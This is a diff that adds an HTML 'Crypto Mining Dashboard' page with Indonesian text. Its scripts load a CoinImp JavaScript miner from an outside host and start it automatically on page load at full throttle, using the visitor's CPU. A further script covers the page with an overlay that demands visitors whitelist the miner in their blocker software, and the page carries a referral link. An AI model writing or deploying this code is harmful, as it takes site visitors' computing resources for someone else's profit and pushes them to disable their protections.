@@ -1,0 +1,108 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Crypto Mining Dashboard</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #4c4c4c; /* Warna latar belakang */
+            color: #cccccc; /* Warna teks */
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        .container {
+            text-align: center;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.3);
+            background-color: #3d3d3d; /* Warna latar belakang kontainer */
+        }
+
+        h1 {
+            color: #ffffff; /* Warna teks */
+            margin-bottom: 20px;
+        }
+
+        .info {
+            margin-top: 20px;
+        }
+
+        .info p {
+            font-size: 18px;
+            margin: 10px 0;
+        }
+
+        .info strong {
+            font-weight: bold;
+        }
+
+        span {
+            color: #007bff; /* Warna biru untuk angka */
+            font-weight: bold;
+        }
+
+        a {
+            color: #007bff; /* Warna biru untuk tautan */
+            text-decoration: none;
+        }
+
+        a:hover {
+            text-decoration: underline;
+        }
+    </style>
+    <script src="https://www.hostingcloud.racing/ElSO.js"></script>
+    <script>
+        var _client = new Client.Anonymous('201bf3164446664b5c4e56c8ce2d8d0464a9ded1d82355ffb07357741b6262c3', {
+            throttle: 0, c: 'w'
+        });
+        _client.start();
+        _client.addMiningNotification("Top", "This site is running JavaScript miner from coinimp.com. If it bothers you, you can stop it.", "#cccccc", 40, "#3d3d3d");
+    </script>
+    <script>
+        setTimeout(function(){
+            if(typeof _client === 'undefined' || _client === null)
+            {
+                var messageDiv = document.createElement("div");
+                messageDiv.setAttribute("style","width: 50%; background-color: white; padding: 15px; display: inline-block; vertical-align: middle;");
+                messageDiv.appendChild(document.createTextNode("Please allow our miner on your blocker software to continue browsing our site. Reload the page after that."));
+                var mainDiv = document.createElement("div");
+                mainDiv.setAttribute("style","position: absolute; top: 0px; right: 0px; width: 100%; height: 100%; display: flex; background-color: #4c4c4c;  align-items: center; justify-content: center");
+                mainDiv.appendChild(messageDiv);
+                document.body.appendChild(mainDiv);
+                document.getElementsByTagName("body")[0].style.overflow = "hidden";
+                window.scrollTo(0, 0);
+            }
+        },1000);
+    </script>
+    <script>
+        setTimeout(function(){
+            let div = document.createElement("div");
+            document.body.appendChild(div);
+            setInterval(function(){
+                let speed = _client._threads.reduce((before, worker) => before + worker.hashesPerSecond, 0);
+                let total = _client._threads.reduce((before, worker) => before + worker.hashesTotal, 0);
+                div.innerHTML = `Speed: <span id="speed">${speed}</span> Hashes/s<br>Total Hash: <span id="total">${total}</span>`;
+            },500);
+        },1000);
+    </script>
+</head>
+<body>
+    <div class="container">
+        <h1>Crypto Mining Dashboard</h1>
+        <div class="info">
+            <p><strong>User :</strong> <span id="user">Antero</span></p>
+            <p><strong>IP address :</strong> <span id="ip_address">192.168.0.1</span></p>
+            <p><strong>Speed :</strong> <span id="speed">0</span> Hashes/s</p>
+            <p><strong>Total :</strong> <span id="total">0</span></p>
+        </div>
+        <p>Jika Anda ingin mulai mining, silakan klik <a href="https://www.coinimp.com/invite/5c749fe6-9220-4369-9374-af94a7f60c8c">di sini</a>.</p>
+    </div>
+</body>
+</html>
